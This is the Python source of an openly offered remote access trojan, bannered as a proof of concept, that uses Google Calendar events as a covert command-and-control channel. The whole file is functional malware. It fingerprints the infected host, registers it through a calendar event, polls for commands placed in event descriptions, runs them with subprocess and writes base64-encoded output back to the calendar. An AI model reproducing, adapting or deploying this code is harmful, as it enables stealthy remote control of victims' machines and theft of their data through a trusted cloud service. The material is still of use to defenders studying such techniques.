import base64
from google.oauth2 import service_account
from googleapiclient.discovery import build
from datetime import datetime, timedelta
import subprocess
import hashlib
import socket
import uuid
import time

c2Calendar = "PUT_YOUR_CALENDAR_ADDRESS_HERE"  # example "mycalendar@gmail.com"
pollingTime = 0


def print_banner():
    banner = """

    █████████    █████████  ███████████  
  ███░░░░░███  ███░░░░░███░░███░░░░░███    GOOGLE-CALENDAR-RAT - POC
 ███     ░░░  ███     ░░░  ░███    ░███   
░███         ░███          ░██████████     Command&Control via Google Calendar Events
░███    █████░███          ░███░░░░░███    
░░███  ░░███ ░░███     ███ ░███    ░███    by: Valerio "MrSaighnal" Alessandroni
 ░░█████████  ░░█████████  █████   █████   https://github.com/MrSaighnal/GCR-Google-Calendar-RAT
  ░░░░░░░░░    ░░░░░░░░░  ░░░░░   ░░░░░ 
                                        
                                        
                                        
    """
    print(banner)
    time.sleep(1.5)


def first_connection(summary, service):
    event = {
        'summary': summary,
        'start': {
            'dateTime': '2023-05-30T00:00:00Z',
            'timeZone': 'Europe/Rome',
        },
        'end': {
            'dateTime': '2023-05-30T00:00:00Z',
            'timeZone': 'Europe/Rome',
        },
        'description': 'whoami|'
    }

    created_event = service.events().insert(calendarId=c2Calendar, body=event).execute()
    print(f"[+] New connection initilialized: {created_event['summary']}")


def generate_hash_md5():
    # Get hostname
    hostname = socket.gethostname()
    # Get MAC address of the first NIC
    mac_address = ':'.join(hex(uuid.getnode())[2:].zfill(12)[i:i + 2] for i in range(0, 12, 2))
    data = hostname + mac_address
    md5_hash = hashlib.md5(data.encode()).hexdigest()
    print(f"[+] generated unique ID: {md5_hash}")
    return md5_hash


# get all the event for the given date
def get_sorted_events(date, service):
    start_date = f'{date[:10]}T00:00:00Z'
    end_date = f'{(datetime.fromisoformat(date[:10]) + timedelta(days=1)).isoformat()[:10]}T23:59:59Z'
    events = service.events().list(calendarId=c2Calendar, timeMin=start_date, timeMax=end_date, singleEvents=True,
                                   orderBy='startTime').execute()
    return events.get('items', [])


def execute_command(command):
    print(f"[+] Executing command: '{command}'")
    try:
        output = subprocess.check_output(command.split())
        return base64.b64encode(output).decode('utf-8')
    except Exception:
        print("[-] Error during execution")


def main():
    print_banner()
    print("[+] GCR - Google Calendar RAT")
    # generate the unique ID
    id = generate_hash_md5()
    # login to Google
    credentials_file = 'credentials.json'
    # set the right date
    event_date = f'{datetime(2023, 5, 30).isoformat()}T00:00:00Z'
    # connect to calendar
    credentials = service_account.Credentials.from_service_account_file(credentials_file, scopes=[
        'https://www.googleapis.com/auth/calendar'])
    service = build('calendar', 'v3', credentials=credentials)

    while 1:
        time.sleep(pollingTime)
        events = get_sorted_events(event_date, service)
        counter = 0
        for event in events:
            summary = event.get('summary', '')
            # Check for previous interactions
            if summary == id:
                counter = + 1
                event_id = event['id']
                old_description = event.get('description', 'Descrizione non disponibile')
                try:
                    # Split the command following the protocol rules
                    command, encoded_result = old_description.split('|')
                except Exception:
                    break
                if command != "" and encoded_result == "":
                    decoded_result = execute_command(command)
                    # update the command output
                    new_description = f"{command}|{decoded_result}"
                    event['description'] = new_description
                    updated_event = service.events().update(calendarId=c2Calendar, eventId=event_id,
                                                            body=event).execute()
                    print(f"[+] sent command ouput for: {command}")

        if counter == 0:
            first_connection(id, service)


if __name__ == "__main__":
    main()
